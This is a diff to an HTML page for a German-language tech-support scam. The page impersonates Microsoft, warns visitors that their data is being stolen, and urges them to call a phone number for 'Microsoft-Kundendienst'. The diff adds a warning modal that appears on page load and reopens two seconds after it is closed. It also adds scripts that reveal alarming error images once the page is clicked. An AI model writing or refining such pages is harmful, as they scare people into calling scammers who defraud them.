@@ -84,7 +84,7 @@
     
     .main_page {
         width: 100vw;
-        height: 100vh;
+        height: 900px;
         background-image: url("mpage.png");
         background-repeat: no-repeat;
     }
@@ -108,10 +108,64 @@
         background-color: rgb(247, 70, 70)
     }
 </style>
+<style>
+    /* Style for the modal container */
+    
+    .modal-container {
+        display: none;
+        /* Initially hidden */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        /* Semi-transparent background */
+        z-index: 9999;
+        /* Higher z-index to make sure it appears above other content */
+    }
+    /* Style for the modal content */
+    /* Style for the modal container */
+    
+    .modal-container {
+        display: none;
+        /* Initially hidden */
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        /* Semi-transparent background */
+        z-index: 9999;
+        /* Higher z-index to make sure it appears above other content */
+    }
+    /* Style for the modal content */
+    
+    .modal-content {
+        position: absolute;
+        top: 50%;
+        width: 500px;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 5px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+    }
+    /* Style for the close button */
+    
+    .close-button {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        cursor: pointer;
+    }
+</style>
 
 <body style="position: relative;">
 
-    <nav class="navbar navbar-expand-lg ">
+    <nav class="navbar navbar-expand-lg " style="display: none;">
 
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
           <span class="navbar-toggler-icon"></span>
@@ -135,7 +189,7 @@
         </div>
     </nav>
 
-    <div class="cont">
+    <div class="cont" style="display: none;">
         <div class="div1">
             <i class="fa-solid fa-arrow-left"></i>
             <i class="fa-solid fa-arrow-right" style="margin: 0px 20px;"></i>
@@ -159,8 +213,40 @@
         <p style="color: white !important;">Aufmerksamkeit von Microsoft aufgrund ungewöhnlicher Aktivitäten</p>
     </div>
     <div class="error_msg2" style="position: absolute; top: 30%; left: 30%; transform: translate(0, -50%); animation: zoomInOut 0.5s infinite alternate; display: none; ">
-        <img src="error.png" alt="" width="750px" height="600px" style="border: 1px solid rgb(185, 185, 185);">
+        <img src="error.png" alt="" width="650px" height="500px" style="border: 1px solid rgb(185, 185, 185);">
     </div>
+
+    <!-- Modal -->
+
+    <div id="modal" class="modal-container">
+        <!-- Modal content -->
+        <div class="modal-content">
+            <span class="close-button" onclick="closeModal()">&times;</span>
+            <h2 style="color: red !important;">Warning</h2>
+            <p>Ihre Daten werden gestohlen. Um dies zu verhindern, rufen Sie den Microsoft-Kundendienst unter <span style="color: rgb(59, 59, 192) !important; font-weight: 600; font-size:20px ;">+49 74729589695</span> an</p>
+        </div>
+    </div>
+
+    <script>
+        // Function to open the modal
+        function openModal() {
+            var modal = document.getElementById('modal');
+            modal.style.display = 'block';
+        }
+
+        // Function to close the modal and reopen after 2 seconds
+        function closeModal() {
+            var modal = document.getElementById('modal');
+            modal.style.display = 'none';
+            setTimeout(openModal, 2000); // Reopen modal after 2 seconds
+        }
+
+        // Function to show modal on page load
+        window.onload = function() {
+            openModal();
+        };
+    </script>
+
     <!-- Optional JavaScript -->
     <!-- jQuery first, then Popper.js, then Bootstrap JS -->
     <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
@@ -192,8 +278,12 @@
         function showError() {
             var errorMessage = document.querySelector('.error_msg');
             var errorMessage2 = document.querySelector('.error_msg2');
+            var navbar = document.querySelector('.navbar');
+            var cont = document.querySelector('.cont');
             errorMessage.style.display = 'block';
             errorMessage2.style.display = 'block';
+            navbar.style.display = 'block';
+            cont.style.display = 'flex';
         }
 
         // Add event listener to the document body to show error message on click
